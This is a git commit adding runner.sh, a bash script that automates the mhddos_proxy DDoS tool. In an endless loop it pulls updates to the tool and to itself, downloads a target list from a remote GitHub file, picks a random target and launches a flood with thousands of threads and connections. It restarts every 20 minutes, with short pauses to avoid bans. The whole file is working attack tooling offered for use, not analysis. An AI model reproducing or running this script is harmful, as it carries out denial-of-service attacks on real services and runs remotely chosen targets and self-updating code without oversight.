82d4542ee2e94cfdf310275d06221726f2b1618e
alexnest-ua <74729549+alexnest-ua@users.noreply.github.com>
2022-05-08 03:40:12 +0300

    Create runner.sh

---
+++ runner.sh
@@ -0,0 +1,125 @@
+#!/bin/bash
+
+set -e 
+
+restart_interval="1200"
+
+ulimit -n 1048576
+
+#Just in case kill previous copy of mhddos_proxy
+echo "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
+pkill runner.py &
+echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
+
+# git config --global --add safe.directory /home/${USER}/auto_mhddos_alexnest
+# git config --global --add safe.directory /home/${USER}/mhddos_proxy
+
+
+threads="${1:-1500}"
+if ((threads < 1000));
+then
+	echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 1000 threads\033[0;0m\n"
+	threads=1000
+elif ((threads > 6000));
+then
+	echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with 6000 threads\033[0;0m\n"
+	threads=6000
+fi
+
+rpc="${2:-1000}"
+if ((rpc < 1000));
+then
+	echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too LOW amount of rpc(connections) - attack will be started with 1000 rpc(connections)\033[0;0m\n"
+	rpc=1000
+elif ((rpc > 5000));
+then
+	echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too HIGH amount of rpc(connections) - attack will be started with 5000 rpc(connections)\033[0;0m\n"
+	rpc=5000
+fi
+
+debug="${3:-}"
+if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ];
+then
+	echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mStarting with parameter --debug (--table is not supported in our script)\033[0;0m\n"
+	debug="--debug"
+fi
+
+vpn="${4:-}"
+if [ "${vpn}" != "--vpn" ] && [ "${vpn}" != "" ];
+then
+	echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mStarting with parameter --vpn\033[0;0m\n"
+	vpn="--vpn"
+fi
+
+echo "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters:  -t $threads --rpc $rpc $debug $vpn...\033[1;0m"
+sleep 7
+
+
+# Restarts attacks and update targets list every 20 minutes
+while [ 1 == 1 ]
+do	
+	cd ~/mhddos_proxy
+
+	num0=$(git pull | grep -c 'Already')
+   	echo "$num0"
+   	
+   	if ((num0 == 1));
+	then
+		clear
+		echo "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
+	else
+		cd ~/mhddos_proxy
+		pip3 install -r requirements.txt
+		clear
+		echo "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
+		sleep 3
+	fi
+	
+	
+	cd ~/auto_mhddos_alexnest
+   	num=$(git pull | grep -c 'Already')
+   	echo "$num"
+   	
+   	if ((num == 1));
+   	then	
+		clear
+		echo "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos_alexnest"
+	else
+		cd ~/auto_mhddos_alexnest
+		clear
+		echo "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos_alexnest"
+		bash runner.sh $num_of_copies $threads $rpc $debug # run new downloaded script 
+	fi
+   	
+	sleep 3
+
+   	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | grep "^[^#]" | wc -l | tr -d " |\n")
+
+	i=`expr $(shuf -i 1-$list_size -n 1) \* 60`
+   	echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
+      
+    echo "\n I = $i"
+    # Filter and only get lines that not start with "#". Then get one target from that filtered list.
+    cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
+           
+    echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
+    echo "python3 runner.py $cmd_line --rpc $rpc -t $threads $debug"
+            
+    cd ~/mhddos_proxy
+    python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug&
+    echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
+
+   	echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
+   	sleep $restart_interval
+	clear
+   	
+   	#Just in case kill previous copy of mhddos_proxy
+   	echo "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
+   	pkill runner.py &
+   	echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
+	
+   	no_ddos_sleep=`expr $(shuf -i 1-3 -n 1) \* 60`
+   	echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to protect your machine from ban...\033[0m\n"
+	sleep $no_ddos_sleep
+	echo "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
+done
